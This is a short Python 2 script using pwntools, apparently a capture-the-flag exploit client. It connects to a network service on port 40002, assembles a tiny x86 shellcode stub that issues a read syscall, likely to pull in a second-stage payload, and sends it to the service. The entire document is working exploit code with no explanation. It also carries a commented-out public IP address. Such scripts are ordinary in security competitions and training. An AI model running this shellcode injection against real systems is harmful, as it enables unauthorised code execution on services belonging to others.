from pwn import *
from pwnlib.asm import *


LOCAL = ('localhost',40002)
LOCAL = (sys.argv[1],40002)
# LOCAL = ('128.199.133.96',31331)
BUFFER = 4096

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

x = asm("""
    mov ax,0x3
    push eax
    pop ebx
    sub cx,128
    push ecx
    pop edx
    int 0x80
    ret
""")

print len(x),x.encode('hex')

raw_input("?")
s.send(x)


print s.recv(BUFFER)
print s.recv(BUFFER)
print s.recv(BUFFER)

s.close()